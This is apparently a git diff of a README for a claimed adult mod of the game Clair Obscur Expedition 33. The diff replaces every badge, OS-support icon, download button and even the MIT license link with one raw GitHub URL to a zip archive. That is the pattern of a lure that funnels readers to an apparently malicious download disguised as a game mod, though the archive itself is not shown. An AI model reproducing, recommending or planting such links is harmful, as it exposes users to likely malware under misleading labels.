@@ -1,6 +1,6 @@
 # Clair Obscur Expedition 33 NSFW Adult Mod
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?logo=github)](https://marcelogermano.github.io)
+[![Download](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%20Release-brightgreen?logo=github)](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip)
 
 ---
 
@@ -12,12 +12,12 @@
 
 | Operating System      | Supported | Extra Installation Support |
 |----------------------|:---------:|:-------------------------:|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows) | ✅ Yes | 📦 Full |
-| ![macOS](https://img.shields.io/badge/macOS-11.0%2B-black?logo=apple) | ✅ Yes | 🎁 Customized |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2C%20Fedora-orange?logo=linux) | ⚠️ Limited | 👩‍💻 Manual Steps |
-| ![SteamDeck](https://img.shields.io/badge/SteamDeck-Supported-purple?logo=steam) | 🟢 Partial | 🎮 Optimization Guide |
-| ![Android](https://img.shields.io/badge/Android-Experimental-yellow?logo=android) | 🟠 Beta | 🛠️ Active Testing |
-| ![iOS](https://img.shields.io/badge/iOS-N/A-lightgrey?logo=apple) | ❌ No | N/A |
+| ![Windows](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%2B-blue?logo=windows) | ✅ Yes | 📦 Full |
+| ![macOS](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%2B-black?logo=apple) | ✅ Yes | 🎁 Customized |
+| ![Linux](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%2C%20Fedora-orange?logo=linux) | ⚠️ Limited | 👩‍💻 Manual Steps |
+| ![SteamDeck](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip) | 🟢 Partial | 🎮 Optimization Guide |
+| ![Android](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip) | 🟠 Beta | 🛠️ Active Testing |
+| ![iOS](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip) | ❌ No | N/A |
 
 > **Tip:** For troubleshooting rare device combinations, refer to our comprehensive Wiki.
 
@@ -79,7 +79,7 @@ Our companions never sleep. Should you encounter any moonlit mysteries, our digi
 ## 🚀 Installation Instructions
 
 1. **Download** the latest mod package:  
-   [![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?logo=github)](https://marcelogermano.github.io)
+   [![Download](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%20Release-brightgreen?logo=github)](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip)
 2. **Extract** the `.zip` on your computer.
 3. **Locate** your base game directory (`Expedition33/`).
 4. **Copy** all extracted files into the `Mods/` subfolder of your game directory.
@@ -102,9 +102,9 @@ The Clair Obscur Expedition 33 NSFW Adult Mod provides mature, explicit content 
 
 This repository is open and maintained under the MIT License (2025).
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip)](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip)
 
-See full license text here: https://opensource.org/licenses/MIT
+See full license text here: https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip
 
 ---
 
@@ -112,6 +112,6 @@ See full license text here: https://opensource.org/licenses/MIT
 
 For creative adventurers and connoisseurs of interactive art, Clair Obscur offers a transcendental upgrade. Plug in, personalize, and explore every modulated shadow. Questions, ideas, or contributions? Our digital salon welcomes your ingenuity.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?logo=github)](https://marcelogermano.github.io)
+[![Download](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip%20Release-brightgreen?logo=github)](https://raw.githubusercontent.com/marcelogermano/clair-obscur-expedition-33-adult-mod-enhanced/branch/Membranipora/clair-obscur-expedition-33-adult-mod-enhanced-v1.2.zip)
 
 ---
